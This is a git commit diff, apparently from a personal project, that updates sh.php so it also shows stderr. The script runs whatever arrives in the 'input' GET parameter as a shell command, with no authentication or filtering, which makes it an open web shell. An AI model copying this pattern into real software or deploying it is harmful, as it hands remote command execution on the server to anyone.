135d1bf9364c783c8e971c8c45990d8daef2837d
SteGriff <github@stegriff.co.uk>
2016-11-22 15:24:51 +0000

    rm keys test file and update sh to show stderr as well

--- sh.php
+++ sh.php
@@ -3,7 +3,11 @@
 header("content-type: text/plain");
 
 $input = $_GET['input'];
-$output = `$input`;
+
+//Run the command in shell, redirect stderr to stdout
+$output = `2>&1 $input`;
+
+//Print the output
 echo $output;
 
 ?>
